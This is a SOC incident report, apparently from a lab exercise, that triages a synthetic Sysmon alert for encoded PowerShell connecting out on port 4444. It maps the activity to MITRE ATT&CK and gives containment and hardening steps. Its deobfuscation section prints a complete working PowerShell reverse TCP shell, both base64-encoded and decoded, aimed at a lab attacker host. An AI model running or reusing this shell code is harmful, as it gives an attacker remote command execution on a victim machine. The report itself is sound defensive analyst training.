# Incident Investigation Report: Suspicious Process & LOLBIN Execution

**Incident Case ID**: INC-20261010-002  
**Severity**: High (Level 10)  
**Assigned Analyst**: Tier 1 SOC Analyst  
**Date/Time of Investigation**: 2026-10-10 11:15:00 UTC  
**Status**: Closed - Confirmed Malicious Simulation (Synthetic Dataset Investigation)  
**Dataset Reference**: [`evidence/evidence-sysmon-encoded-ps.json`](../../evidence/evidence-sysmon-encoded-ps.json)

---

## 1. Executive Summary
At 11:08:42 UTC, the Wazuh SIEM triggered Rule `100302` (*PowerShell Base64 Encoded Command Execution*) and Rule `100305` (*LOLBIN Outbound Network Connection on Non-Standard Port*). Analysis of the synthetic test event sequence for Sysmon Event ID 1 (Process Create) and Event ID 3 (Network Connect) confirmed that `powershell.exe` was spawned by parent process `cmd.exe` with base64 encoded parameters, subsequently establishing an outbound TCP connection to lab host `192.168.56.50:4444`.

> **Note on Lab Methodology**: This investigation evaluates a controlled synthetic test fixture designed to validate Tier 1 analysis and payload deobfuscation skills. Live malware was not detonated.

---

## 2. Five Ws (Triage Checklist)

| Question | Investigation Finding | Supporting Evidence |
| :--- | :--- | :--- |
| **What was detected?** | Obfuscated PowerShell execution + Outbound TCP 4444 connection | Wazuh Rules `100302` and `100305` |
| **Which endpoint was involved?** | Hostname: `WIN-LAB-EP01` (IP: `192.168.56.101`) | Wazuh Agent ID `001` |
| **Which user was involved?** | User context: `WIN-LAB-EP01\jdoe` | Field: `win.eventdata.user` |
| **When did it occur?** | 2026-10-10 11:08:35 UTC to 11:08:42 UTC (7 seconds total) | Sysmon Event Timestamps |
| **Processes involved?** | Parent: `cmd.exe` (PID 4912) ➔ Child: `powershell.exe` (PID 6104) | Sysmon Event ID 1 (`Image`, `ParentImage`) |

---

## 3. Deep-Dive Log Evidence & Payload Deobfuscation

### Sysmon Event ID 1 (Process Creation)
- **Image**: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- **Parent Image**: `C:\Windows\System32\cmd.exe`
- **User**: `WIN-LAB-EP01\jdoe`
- **Recorded Command Line**:
  ```powershell
  powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADUANgAuADUAMAAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
  ```

### Deobfuscation Analysis (Base64 UTF-16LE Decode)
Using CyberChef or Python base64 decoding:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.56.50',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```
*Analytical Finding*: The payload is a classic PowerShell reverse TCP interactive shell establishing an unencrypted C2 channel back to the lab attacker host.

### Sysmon Event ID 3 (Network Connection)
- **Initiating Process**: `powershell.exe` (PID 6104)
- **Source IP / Port**: `192.168.56.101` : `49721`
- **Destination IP / Port**: `192.168.56.50` : `4444` (Lab adversary host)
- **Protocol**: `tcp`

---

## 4. Assessment: Benign vs. Malicious
- **Benign Baseline Comparison**: Administrative scripts routinely automate tasks via PowerShell, but legitimate enterprise IT does not execute interactive reverse socket loops or connect out to port 4444.
- **Classification**: **Confirmed Malicious (Simulated)** — Mapped to MITRE ATT&CK T1059.001 (Command and Scripting Interpreter: PowerShell), T1027 (Obfuscated Files or Information), and T1071.001 (Application Layer Protocol).

---

## 5. Defensive Recommendations & Incident Response
1. **Immediate Host Containment**:
   - Sever network connectivity for `WIN-LAB-EP01` to prevent lateral movement.
   - Terminate offending process trees (`powershell.exe` PID 6104, `cmd.exe` PID 4912).
2. **Persistence & Telemetry Investigation**:
   - Inspect Sysmon Event ID 11 (File Creation) in `C:\Users\jdoe\` for secondary payloads.
   - Query Sysmon Event ID 13 (RegistryEvent Value Set) for persistence entries under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
3. **Hardening**:
   - Enforce PowerShell Constrained Language Mode (CLM) via AppLocker/WDAC.
   - Enable Script Block Logging (Windows Event ID 4104) for deeper script visibility.
